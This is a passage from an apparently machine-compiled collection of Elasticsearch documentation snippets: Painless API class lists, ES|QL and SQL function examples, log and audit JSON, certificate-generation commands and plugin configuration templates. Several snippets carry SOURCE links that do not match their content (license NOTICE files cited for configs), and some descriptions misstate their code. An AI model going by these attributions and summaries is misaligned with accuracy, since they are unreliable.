\"rightPOS\": \"VA(Adjective)\"\n        },\n        {\n          \"token\": \"은\",\n          \"start_offset\": 5,\n          \"end_offset\": 6,\n          \"type\": \"word\",\n          \"position\": 3,\n          \"leftPOS\": \"ETM(Adnominal form transformative ending)\",\n          \"morphemes\": null,\n          \"posType\": \"MORPHEME\",\n          \"reading\": null,\n          \"rightPOS\": \"ETM(Adnominal form transformative ending)\"\n        },\n        {\n          \"token\": \"나무\",\n          \"start_offset\": 7,\n          \"end_offset\": 9,\n          \"type\": \"word\",\n          \"position\": 4,\n          \"leftPOS\": \"NNG(General Noun)\",\n          \"morphemes\": null,\n          \"posType\": \"MORPHEME\",\n          \"reading\": null,\n          \"rightPOS\": \"NNG(General Noun)\"\n        },\n        {\n          \"token\": \"는\",\n          \"start_offset\": 9,\n          \"end_offset\": 10,\n          \"type\": \"word\",\n          \"position\": 5,\n          \"leftPOS\": \"JX(Auxiliary postpositional particle)\",\n          \"morphemes\": null,\n          \"posType\": \"MORPHEME\",\n          \"reading\": null,\n          \"rightPOS\": \"JX(Auxiliary postpositional particle)\"\n        }\n      ]\n    },\n    \"tokenfilters\": []\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining JSON Class Methods for Loading and Dumping in Painless API\nDESCRIPTION: This snippet defines a class within the Elasticsearch Painless API for performing JSON operations, including loading a JSON string and dumping an object into a JSON string format. The 'load' method takes a JSON string as input, while the 'dump' method can serialize an object to a JSON string, with an optional boolean parameter to control the output.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.json.txt#2025-04-21_snippet_0\n\nLANGUAGE: groovy\nCODE:\n```\nclass org.elasticsearch.painless.api.Json {\n  def load(String)\n  String dump(def)\n  String dump(def, boolean)\n}\n```\n\n----------------------------------------\n\nTITLE: More Compact Script Error Format in ElasticSearch\nDESCRIPTION: This snippet shows a more compact error response format for script exceptions in ElasticSearch. It still includes the cause information but with a simplified structure, focusing on the core error details.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/vector-tile/licenses/slf4j-api-NOTICE.txt#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"error\": {\n    \"root_cause\": [...],\n    \"type\": \"script_exception\",\n    \"reason\": \"runtime error\",\n    \"script_stack\": [...],\n    \"script\": \"...\",\n    \"lang\": \"painless\",\n    \"caused_by\": {\n      \"type\": \"illegal_argument_exception\",\n      \"reason\": \"Dynamic method [org.elasticsearch.compute.ann.VectorSimilarity, cosineSimilarity, [double[] #1<local>, double[] #2<local>]] not found\"\n    }\n  },\n  \"status\": 500\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing YAML REST Test Suite in Java\nDESCRIPTION: This Java class sets up the YAML REST test suite for the custom Elasticsearch plugin. It extends ESClientYamlSuiteTestCase to use Elasticsearch's test framework.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/extend/example-text-analysis-plugin.md#2025-04-21_snippet_5\n\nLANGUAGE: java\nCODE:\n```\nimport com.carrotsearch.randomizedtesting.annotations.Name;\nimport com.carrotsearch.randomizedtesting.annotations.ParametersFactory;\nimport org.elasticsearch.test.rest.yaml.ClientYamlTestCandidate;\nimport org.elasticsearch.test.rest.yaml.ESClientYamlSuiteTestCase;\n\npublic class HelloWorldPluginClientYamlTestSuiteIT extends ESClientYamlSuiteTestCase {\n\n    public HelloWorldPluginClientYamlTestSuiteIT(\n            @Name(\"yaml\") ClientYamlTestCandidate testCandidate\n    ) {\n        super(testCandidate);\n    }\n\n    @ParametersFactory\n    public static Iterable<Object[]> parameters() throws Exception {\n        return ESClientYamlSuiteTestCase.createParameters();\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Up TDVT Workspace\nDESCRIPTION: Command to initialize a TDVT workspace, which creates the necessary directory structure for testing. This is part of the manual testing procedure.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/connectors/tableau/tdvt/README.md#2025-04-21_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\n$TDVT action --setup\n```\n\n----------------------------------------\n\nTITLE: Converting Radians to Degrees using TO_DEGREES in Elasticsearch SQL\nDESCRIPTION: This snippet demonstrates how to use the TO_DEGREES function to convert an array of radian values to degrees. It creates a row with a 'rad' column containing radian values, then uses EVAL to apply the TO_DEGREES function and store the result in a new 'deg' column.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/to_degrees.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW rad = [1.57, 3.14, 4.71]\n| EVAL deg = TO_DEGREES(rad)\n```\n\n----------------------------------------\n\nTITLE: Creating Third CA PEM - ca3 with Elasticsearch Certutil\nDESCRIPTION: This snippet creates the third CA PEM file named 'ca3' using the Elasticsearch certutil command, maintaining the same validity and structure as previous CAs.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/ssl-config/src/test/resources/certs/README.txt#2025-04-21_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n# 3. Create first CA PEM (\"ca3\")\nelasticsearch-certutil ca --pem --out ca3.zip --days 9999 --ca-dn \"CN=Test CA 3\"\nunzip ca3.zip \nmv ca ca3\n```\n\n----------------------------------------\n\nTITLE: Displaying Search Slow Log Event in JSON Format\nDESCRIPTION: This snippet shows an example of a search event in the Elasticsearch slow log, formatted as JSON. It includes various fields such as timestamp, cluster information, search details, and user data.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/slow-log.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"@timestamp\": \"2024-12-21T12:42:37.255Z\",\n  \"auth.type\": \"REALM\",\n  \"ecs.version\": \"1.2.0\",\n  \"elasticsearch.cluster.name\": \"distribution_run\",\n  \"elasticsearch.cluster.uuid\": \"Ui23kfF1SHKJwu_hI1iPPQ\",\n  \"elasticsearch.node.id\": \"JK-jn-XpQ3OsDUsq5ZtfGg\",\n  \"elasticsearch.node.name\": \"node-0\",\n  \"elasticsearch.slowlog.id\": \"tomcat-123\",\n  \"elasticsearch.slowlog.message\": \"[index6][0]\",\n  \"elasticsearch.slowlog.search_type\": \"QUERY_THEN_FETCH\",\n  \"elasticsearch.slowlog.source\": \"{\\\"query\\\":{\\\"match_all\\\":{\\\"boost\\\":1.0}}}\",\n  \"elasticsearch.slowlog.stats\": \"[]\",\n  \"elasticsearch.slowlog.took\": \"747.3micros\",\n  \"elasticsearch.slowlog.took_millis\": 0,\n  \"elasticsearch.slowlog.total_hits\": \"1 hits\",\n  \"elasticsearch.slowlog.total_shards\": 1,\n  \"event.dataset\": \"elasticsearch.index_search_slowlog\",\n  \"fileset.name\" : \"slowlog\",\n  \"log.level\": \"WARN\",\n  \"log.logger\": \"index.search.slowlog.query\",\n  \"process.thread.name\": \"elasticsearch[runTask-0][search][T#5]\",\n  \"service.name\": \"ES_ECS\",\n  \"user.name\": \"elastic\",\n  \"user.realm\": \"reserved\"\n}\n```\n\n----------------------------------------\n\nTITLE: Example of CBRT Function Usage\nDESCRIPTION: Shows how to calculate the cube root of a negative number using the CBRT function, demonstrating that it works with negative values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_3\n\nLANGUAGE: sql\nCODE:\n```\nSELECT CBRT(-125.5);\n\n   CBRT(-125.5)\n-------------------\n-5.0066577974783435\n```\n\n----------------------------------------\n\nTITLE: Interpreting the Search Query Results in Elasticsearch\nDESCRIPTION: The result block reflects the outcome of executing the Elasticsearch query, indicating the 'day-of-week' and 'number-of-actors' for each of the two returned documents. It presumes existing documents with appropriate fields indexed.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs-mdx/painless/painless-field-context.mdx#2025-04-21_snippet_3\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"took\" : 68,\n  \"timed_out\" : false,\n  \"_shards\" : {\n    \"total\" : 1,\n    \"successful\" : 1,\n    \"skipped\" : 0,\n    \"failed\" : 0\n  },\n  \"hits\" : {\n    \"total\" : {\n      \"value\" : 11,\n      \"relation\" : \"eq\"\n    },\n    \"max_score\" : 1.0,\n    \"hits\" : [\n      {\n        \"_index\" : \"seats\",\n        \"_id\" : \"1\",\n        \"_score\" : 1.0,\n        \"fields\" : {\n          \"day-of-week\" : [\n            \"Thursday\"\n          ],\n          \"number-of-actors\" : [\n            4\n          ]\n        }\n      },\n      {\n        \"_index\" : \"seats\",\n        \"_id\" : \"2\",\n        \"_score\" : 1.0,\n        \"fields\" : {\n          \"day-of-week\" : [\n            \"Thursday\"\n          ],\n          \"number-of-actors\" : [\n            1\n          ]\n        }\n      }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: HTML Highlighting Tag Schema Definition\nDESCRIPTION: Defines the built-in HTML tag schema for styled highlighting in Elasticsearch. Shows the pre-defined CSS classes for highlighted text elements.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<em class=\"hlt1\">, <em class=\"hlt2\">, <em class=\"hlt3\">,\n<em class=\"hlt4\">, <em class=\"hlt5\">, <em class=\"hlt6\">,\n<em class=\"hlt7\">, <em class=\"hlt8\">, <em class=\"hlt9\">,\n<em class=\"hlt10\">\n```\n\n----------------------------------------\n\nTITLE: Uploading extension file from local path in Elasticsearch Service\nDESCRIPTION: Uploads the actual extension file from a local path using the extension ID obtained from the metadata creation step. Uses the PUT method with the -T option for reliable file transfer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/cloud/ec-plugins-guide.md#2025-04-21_snippet_3\n\nLANGUAGE: sh\nCODE:\n```\ncurl -v -X PUT \"https://api.elastic-cloud.com/api/v1/deployments/extensions/EXTENSION_ID\" \\\n-H 'Content-type:application/zip' \\\n-H \"Authorization: ApiKey $CLOUD_API_KEY\" \\\n-H 'Expect:' \\\n-T \"/path_to/custom-plugin-8.4.3.zip\"\n```\n\n----------------------------------------\n\nTITLE: Defining java.util.regex.Matcher Class Interface for Painless\nDESCRIPTION: Defines available Matcher class methods for regex operations in Painless. Includes methods for finding matches, grouping, region manipulation, and replacement operations. Explicitly excludes reset(String) method for security.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.regex.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nclass java.util.regex.Matcher {\n  int end()\n  int end(int)\n  boolean find()\n  boolean find(int)\n  String group()\n  String group(int)\n  String org.elasticsearch.painless.api.Augmentation namedGroup(String)\n  int groupCount()\n  boolean hasAnchoringBounds()\n  boolean hasTransparentBounds()\n  boolean hitEnd()\n  boolean lookingAt()\n  boolean matches()\n  Pattern pattern()\n  String quoteReplacement(String)\n  Matcher region(int,int)\n  int regionEnd()\n  int regionStart()\n  String replaceAll(String)\n  String replaceFirst(String)\n  boolean requireEnd()\n  Matcher reset()\n  int start()\n  int start(int)\n  Matcher useAnchoringBounds(boolean)\n  Matcher usePattern(Pattern)\n  Matcher useTransparentBounds(boolean)\n}\n```\n\n----------------------------------------\n\nTITLE: End-to-End Testing Command for GitHub Connector\nDESCRIPTION: This shell command allows users to run functional tests for the GitHub connector using the 'make' command. Users can adjust the testing conditions with the 'DATA_SIZE' flag for faster tests.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-github.md#2025-04-21_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\n$ make ftest NAME=github\n```\n\nLANGUAGE: shell\nCODE:\n```\nmake ftest NAME=github DATA_SIZE=small\n```\n\n----------------------------------------\n\nTITLE: Monitor Watcher Privilege\nDESCRIPTION: Read-only access for watcher operations including getting watch and watcher stats. Not available in serverless deployments\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/security-privileges.md#2025-04-21_snippet_7\n\nLANGUAGE: markdown\nCODE:\n```\nmonitor_watcher\n```\n\n----------------------------------------\n\nTITLE: Describing TO_DATETIME Function in ESQL\nDESCRIPTION: This markdown snippet describes the TO_DATETIME function in ESQL. It explains that the function converts input values to date values, specifies the accepted date format, and notes the behavior when converting from nanosecond to millisecond resolution.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/to_datetime.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Description**\n\nConverts an input value to a date value. A string will only be successfully converted if it's respecting the format `yyyy-MM-dd'T'HH:mm:ss.SSS'Z'`. To convert dates in other formats, use [`DATE_PARSE`](/reference/query-languages/esql/functions-operators/date-time-functions.md#esql-date_parse).\n\n::::{note}\nNote that when converting from nanosecond resolution to millisecond resolution with this function, the nanosecond date is truncated, not rounded.\n::::\n```\n\n----------------------------------------\n\nTITLE: Input Document for Wildcard Expansion\nDESCRIPTION: Shows an example document with multiple top-level dotted fields before processing with wildcard.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/dot-expand-processor.md#2025-04-21_snippet_8\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"foo.bar\" : \"value\",\n  \"baz.qux\" : \"value\"\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Geographic and Scripted Field API in Painless\nDESCRIPTION: Details the classes related to geographic manipulations and scripted fields in Painless for Elasticsearch. Includes 'GeoPoint' for location data, and various 'ScriptDocValues' classes for accessing document field data in custom scripts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.txt#2025-04-21_snippet_2\n\nLANGUAGE: Painless\nCODE:\n```\nclass org.elasticsearch.common.geo.GeoPoint {\n  ()\n  (double, double)\n  double getLat()\n  double getLon()\n}\n\nclass org.elasticsearch.common.geo.GeoBoundingBox {\n  org.elasticsearch.common.geo.GeoPoint topLeft()\n  org.elasticsearch.common.geo.GeoPoint bottomRight()\n}\n\nclass org.elasticsearch.index.fielddata.ScriptDocValues$Strings {\n  String get(int)\n  String getValue()\n}\n\nclass org.elasticsearch.index.fielddata.ScriptDocValues$Longs {\n  Long get(int)\n  long getValue()\n}\n\nclass org.elasticsearch.index.fielddata.ScriptDocValues$Dates {\n  ZonedDateTime get(int)\n  ZonedDateTime getValue()\n}\n\nclass org.elasticsearch.index.fielddata.ScriptDocValues$Doubles {\n  Double get(int)\n  double getValue()\n}\n\nclass org.elasticsearch.index.fielddata.ScriptDocValues$Geometry {\n  int getDimensionalType()\n  org.elasticsearch.common.geo.GeoPoint getCentroid()\n  org.elasticsearch.common.geo.GeoBoundingBox getBoundingBox()\n  org.elasticsearch.common.geo.GeoPoint getLabelPosition()\n  double getMercatorWidth()\n  double getMercatorHeight()\n}\n\nclass org.elasticsearch.index.fielddata.ScriptDocValues$GeoPoints {\n  org.elasticsearch.common.geo.GeoPoint get(int)\n  org.elasticsearch.common.geo.GeoPoint getValue()\n  double getLat()\n  double getLon()\n  double[] getLats()\n  double[] getLons()\n\n  # geo distance functions\n  double arcDistance(double,double)\n  double arcDistanceWithDefault(double,double,double)\n  double planeDistance(double,double)\n  double planeDistanceWithDefault(double,double,double)\n  double geohashDistance(String)\n  double geohashDistanceWithDefault(String,double)\n}\n\nclass org.elasticsearch.index.fielddata.ScriptDocValues$Booleans {\n  Boolean get(int)\n  boolean getValue()\n}\n\nclass org.elasticsearch.index.fielddata.ScriptDocValues$BytesRefs {\n  BytesRef get(int)\n  BytesRef getValue()\n}\n\n```\n\n----------------------------------------\n\nTITLE: Export Node Private Key\nDESCRIPTION: Extracts the node's private key from PKCS#12 store using OpenSSL\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/test/ssl/README.md#2025-04-21_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\nopenssl pkcs12 -in test-node.p12 -passin pass:keypass -nocerts -passout pass:test-node-key-password -out test-node.key\n```\n\n----------------------------------------\n\nTITLE: Calculating Arcsine Using ASIN Function in ESQL\nDESCRIPTION: Demonstrates how to use the ASIN function to calculate the arcsine of a numeric value (0.9) in ESQL. The result is returned in radians. The example creates a row with value 'a' and computes its arcsine using the ASIN function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/asin.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=.9\n| EVAL asin=ASIN(a)\n```\n\n----------------------------------------\n\nTITLE: Running End-to-End Tests for Slack Connector\nDESCRIPTION: Commands for executing functional end-to-end tests for the Slack connector. The tests can be run with default settings or with a small data size for faster execution.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-slack.md#2025-04-21_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\n$ make ftest NAME=slack\n```\n\nLANGUAGE: shell\nCODE:\n```\nmake ftest NAME=slack DATA_SIZE=small\n```\n\n----------------------------------------\n\nTITLE: Monitor Text Structure Privilege\nDESCRIPTION: Read-only access to the find structure API operations. Not available in serverless deployments\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/security-privileges.md#2025-04-21_snippet_5\n\nLANGUAGE: markdown\nCODE:\n```\nmonitor_text_structure\n```\n\n----------------------------------------\n\nTITLE: Analysis Response Example\nDESCRIPTION: Response showing the tokens generated after analysis, demonstrating how the Korean numeral is removed.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-nori-speech.md#2025-04-21_snippet_2\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"tokens\" : [ {\n    \"token\" : \"용\",\n    \"start_offset\" : 3,\n    \"end_offset\" : 4,\n    \"type\" : \"word\",\n    \"position\" : 1\n  }, {\n    \"token\" : \"이\",\n    \"start_offset\" : 4,\n    \"end_offset\" : 5,\n    \"type\" : \"word\",\n    \"position\" : 2\n  } ]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Elasticsearch Plugin Descriptor Template\nDESCRIPTION: Template for plugin-descriptor.properties file that defines plugin metadata including name, version, Java compatibility, and Elasticsearch version requirements. The template includes both mandatory elements like description, version, and name, as well as optional elements like classname and modulename.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/extend/plugin-descriptor-file-classic.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n# Elasticsearch plugin descriptor file\n# This file must exist as 'plugin-descriptor.properties' or 'stable-plugin-descriptor.properties inside a plugin.\n#\n## example plugin for \"foo\"\n#\n# foo.zip <-- zip file for the plugin, with this structure:\n# |____   <arbitrary name1>.jar <-- classes, resources, dependencies\n# |____   <arbitrary nameN>.jar <-- any number of jars\n# |____   plugin-descriptor.properties <-- example contents below:\n#\n# classname=foo.bar.BazPlugin\n# description=My cool plugin\n# version=6.0\n# elasticsearch.version=6.0\n# java.version=1.8\n#\n## mandatory elements for all plugins:\n#\n# 'description': simple summary of the plugin\ndescription=${description}\n#\n# 'version': plugin's version\nversion=${version}\n#\n# 'name': the plugin name\nname=${name}\n#\n# 'java.version': version of java the code is built against\n# use the system property java.specification.version\n# version string must be a sequence of nonnegative decimal integers\n# separated by \".\"'s and may have leading zeros\njava.version=${javaVersion}\n#\n# 'elasticsearch.version': version of elasticsearch compiled against.\n# Plugins implementing plugin-api.jar this version only has to match a major version of the ES server\n# For all other plugins it has to be the same as ES server version\nelasticsearch.version=${elasticsearchVersion}\n## optional elements for plugins:\n<% if (classname) { %>\n#\n# 'classname': the name of the class to load, fully-qualified. Only applies to\n# \"isolated\" plugins\nclassname=${classname}\n<% } %>\n<% if (modulename) { %>\n#\n# 'modulename': the name of the module to load classname from. Only applies to\n# \"isolated\" plugins. This is optional. Specifying it causes the plugin\n# to be loaded as a module.\nmodulename=${modulename}\n<% } %>\n<% if (extendedPlugins) { %>\n#\n#  'extended.plugins': other plugins this plugin extends through SPI\nextended.plugins=${extendedPlugins}\n<% } %>\n<% if (hasNativeController) { %>\n#\n# 'has.native.controller': whether or not the plugin has a native controller\nhas.native.controller=${hasNativeController}\n<% } %>\n<% if (licensed) { %>\n# This plugin requires that a license agreement be accepted before installation\nlicensed=${licensed}\n<% } %>\n```\n\n----------------------------------------\n\nTITLE: Creating Index Mappings for DateTime Examples in Elasticsearch\nDESCRIPTION: Console command to create a 'messages' index with mappings for priority, datetime, and message fields for use in the datetime examples.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_27\n\nLANGUAGE: console\nCODE:\n```\nPUT /messages\n{\n  \"mappings\": {\n    \"properties\": {\n      \"priority\": {\n        \"type\": \"integer\"\n      },\n      \"datetime\": {\n        \"type\": \"date\"\n      },\n      \"message\": {\n        \"type\": \"text\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Number Conversion and Comparison in Elasticsearch Script\nDESCRIPTION: Demonstrates the use of scripts to convert fields to numbers and then apply equality or inequality checks. Validates that `serial_event_id` equals the numeric conversion of a hexadecimal input.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/test/resources/querytranslator_tests.txt#2025-04-21_snippet_17\n\nLANGUAGE: Elasticsearch Painless\nCODE:\n```\n{\"term\":{\"serial_event_id\":{\"value\":-32.5}}\n```\n\n----------------------------------------\n\nTITLE: Unsigned Long Document Values Field Class\nDESCRIPTION: Comprehensive class for handling unsigned long document values with multiple getter methods, value retrieval, and big integer conversions\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/mapper-unsigned-long/src/main/resources/org/elasticsearch/xpack/unsignedlong/org.elasticsearch.xpack.unsignedlong.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.xpack.unsignedlong.UnsignedLongDocValuesField @dynamic_type {\n  long get(long)\n  long get(int, long)\n  long getValue(long)\n  long getValue(int, long)\n  List getValues()\n  BigInteger asBigInteger(BigInteger)\n  BigInteger asBigInteger(int, BigInteger)\n  List asBigIntegers()\n}\n```\n\n----------------------------------------\n\nTITLE: Cartesian-bounds Aggregation Response for Shape Data\nDESCRIPTION: This snippet shows the response format for a cartesian-bounds aggregation on Shape data, including the top-left and bottom-right coordinates of the bounding box encompassing all shapes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-cartesian-bounds-aggregation.md#2025-04-21_snippet_5\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"aggregations\": {\n    \"viewport\": {\n      \"bounds\": {\n        \"top_left\": {\n          \"x\": 491.2349853515625,\n          \"y\": 5239.4208984375\n        },\n        \"bottom_right\": {\n          \"x\": 496.9425048828125,\n          \"y\": 5237.408203125\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Sample SSL Certificate for Outlook Server\nDESCRIPTION: This snippet provides an example of an SSL certificate content that can be used for the ssl_ca configuration when connecting to an Outlook Server with SSL enabled.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-outlook.md#2025-04-21_snippet_2\n\nLANGUAGE: txt\nCODE:\n```\n-----BEGIN CERTIFICATE-----\nMIID+jCCAuKgAwIBAgIGAJJMzlxLMA0GCSqGSIb3DQEBCwUAMHoxCzAJBgNVBAYT\n...\n7RhLQyWn2u00L7/9Omw=\n-----END CERTIFICATE-----\n```\n\n----------------------------------------\n\nTITLE: Authentication Success Event Logging in Elasticsearch\nDESCRIPTION: JSON structure for logging successful user authentication events.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/elasticsearch-audit-events.md#2025-04-21_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\n{\"type\":\"audit\", \"timestamp\":\"2020-12-30T22:03:35,018+0200\", \"node.id\":\"0RMNyghkQYCc_gVd1G6tZQ\", \"event.type\":\"rest\", \"event.action\":\"authentication_success\", \"authentication.type\":\"REALM\", \"user.name\":\"elastic\", \"user.realm\":\"reserved\", \"origin.type\":\"rest\", \"origin.address\":\"[::1]:51014\", \"realm\":\"reserved\", \"url.path\":\"/twitter/_search\", \"url.query\":\"pretty\", \"request.method\":\"POST\", \"request.id\":\"nHV3UMOoSiu-TaSPWCfxGg\"}\n```\n\n----------------------------------------\n\nTITLE: SQL Query for MIN Aggregation\nDESCRIPTION: This SQL query selects the minimum value of the keyword field from the test table.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_24\n\nLANGUAGE: SQL\nCODE:\n```\nSELECT MIN(keyword) FROM test;\n```\n\n----------------------------------------\n\nTITLE: Configuring HTTP Anonymous Authentication in Elasticsearch\nDESCRIPTION: YAML configuration for allowing anonymous access to Elasticsearch. This configuration permits unauthenticated access with a specific user role assigned to anonymous users.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/watcher/licenses/failureaccess-NOTICE.txt#2025-04-21_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.http.authentication.type: anonymous\nxpack.security.http.authentication.anonymous.username: anonymous_user\nxpack.security.http.authentication.anonymous.roles: anonymous_user_role\nxpack.security.http.authentication.anonymous.authz_exception: false\n```\n\n----------------------------------------\n\nTITLE: ESQL Weighted Average Parameters Definition\nDESCRIPTION: Defines two parameters required for weighted average calculations: a numeric value and its corresponding weight. Part of ESQL's automated test case documentation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/weighted_avg.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Parameters**\n\n`number`\n:   A numeric value.\n\n`weight`\n:   A numeric weight.\n```\n\n----------------------------------------\n\nTITLE: ESQL String Uppercase Function Description\nDESCRIPTION: Documentation for a function that converts an input string to uppercase format. This is an auto-generated test case that should not be manually modified.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/to_upper.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Description**\n\nReturns a new string representing the input string converted to upper case.\n```\n\n----------------------------------------\n\nTITLE: SQL Comments in Elasticsearch\nDESCRIPTION: Shows both single-line and multi-line comment syntax in Elasticsearch SQL, including support for nested comments in the multi-line style.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-lexical-structure.md#2025-04-21_snippet_7\n\nLANGUAGE: sql\nCODE:\n```\n-- single line comment\n/* multi\n   line\n   comment\n   that supports /* nested comments */\n   */\n```\n\n----------------------------------------\n\nTITLE: Integer Literal Examples\nDESCRIPTION: Demonstrates various integer literal notations including decimal, octal, and hexadecimal values with type specifiers.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-literals.md#2025-04-21_snippet_1\n\nLANGUAGE: painless\nCODE:\n```\n0     \n0D    \n1234L \n-90f  \n-022  \n0xF2A \n```\n\n----------------------------------------\n\nTITLE: Read CCR Privilege\nDESCRIPTION: Read-only access for Cross Cluster Replication operations. Required for clusters with leader indices. Not available in serverless deployments\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/security-privileges.md#2025-04-21_snippet_8\n\nLANGUAGE: markdown\nCODE:\n```\nread_ccr\n```\n\n----------------------------------------\n\nTITLE: Running Benchmark with Parameters\nDESCRIPTION: Example of running a benchmark with specific parameters including rounder, range, zone, interval, and count settings\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/benchmarks/README.md#2025-04-21_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ngradlew -p benchmarks/ run --args 'RoundingBenchmark.round -prounder=es -prange=\"2000-10-01 to 2000-11-01\" -pzone=America/New_York -pinterval=10d -pcount=1000000'\n```\n\n----------------------------------------\n\nTITLE: Logging with Placeholders in Elasticsearch (Java)\nDESCRIPTION: Demonstrates how to log messages with placeholders for dynamic values in Elasticsearch, improving performance by avoiding string concatenation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/CONTRIBUTING.md#2025-04-21_snippet_10\n\nLANGUAGE: java\nCODE:\n```\nlogger.debug(\"operation failed [{}] times in [{}]ms\", failureCount, elapsedMillis);\n```\n\n----------------------------------------\n\nTITLE: Configuring Elasticsearch for Azure Discovery\nDESCRIPTION: YAML configuration for the Elasticsearch Azure Discovery plugin, specifying Azure subscription ID, cloud service name, keystore path and password, and discovery type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-azure-classic-long.md#2025-04-21_snippet_11\n\nLANGUAGE: yaml\nCODE:\n```\n# If you don't remember your account id, you may get it with `azure account list`\ncloud:\n    azure:\n        management:\n             subscription.id: your_azure_subscription_id\n             cloud.service.name: your_azure_cloud_service_name\n             keystore:\n                   path: /home/elasticsearch/azurekeystore.pkcs12\n                   password: your_password_for_keystore\n\ndiscovery:\n    type: azure\n\n# Recommended (warning: non durable disk)\n# path.data: /mnt/resource/elasticsearch/data\n```\n\n----------------------------------------\n\nTITLE: Defining Field Interfaces for Elasticsearch Scripts in Java\nDESCRIPTION: This code segment defines interfaces for various fields used in Elasticsearch scripts. Each class represents a field type, providing methods to retrieve field data in different formats. These fields are typically utilized within script contexts where 